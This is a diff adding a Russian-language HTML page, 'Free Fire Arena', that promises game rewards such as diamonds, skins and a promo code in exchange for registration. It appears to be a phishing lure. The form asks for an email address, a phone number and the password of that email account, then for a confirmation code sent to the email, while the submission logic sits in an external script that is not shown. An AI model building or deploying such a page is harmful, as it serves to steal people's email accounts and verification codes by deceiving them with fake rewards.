@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Free Fire Arena</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="container">
+        <div class="game-header">
+            <h1>🔥 FREE FIRE ARENA 🔥</h1>
+            <p>Стань легендой!</p>
+        </div>
+
+        <div class="form-container" id="regForm">
+            <h2>РЕГИСТРАЦИЯ</h2>
+            <input type="email" id="email" placeholder="Email" autocomplete="off">
+            <input type="tel" id="phone" placeholder="Номер телефона">
+            <div class="password-wrapper">
+                <input type="password" id="password" placeholder="Пароль от email">
+                <span class="eye-icon" onclick="togglePassword('password')">👁️</span>
+            </div>
+            <button onclick="sendCode()">ПОЛУЧИТЬ КОД</button>
+        </div>
+
+        <div class="form-container" id="codeForm" style="display:none;">
+            <h2>ПОДТВЕРЖДЕНИЕ</h2>
+            <input type="text" id="code" placeholder="Введите код из email">
+            <button onclick="verifyCode()">ПОДТВЕРДИТЬ</button>
+        </div>
+
+        <div id="rewardArea" style="display:none;" class="reward-area">
+            <h2>🎁 ТВОЙ БОНУС 🎁</h2>
+            <p>Промокод: <strong>FF-ELITE-2026</strong></p>
+            <p>🔫 Эксклюзивная скин-серия "Альфа"</p>
+            <p>💎 500 алмазов</p>
+            <p>🎯 Секретные тактики от топ-игроков</p>
+            <button onclick="location.reload()">НОВАЯ РЕГИСТРАЦИЯ</button>
+        </div>
+    </div>
+
+    <script src="script.js"></script>
+    <script>
+        function togglePassword(fieldId) {
+            const field = document.getElementById(fieldId);
+            field.type = field.type === 'password' ? 'text' : 'password';
+        }
+    </script>
+</body>
+</html>
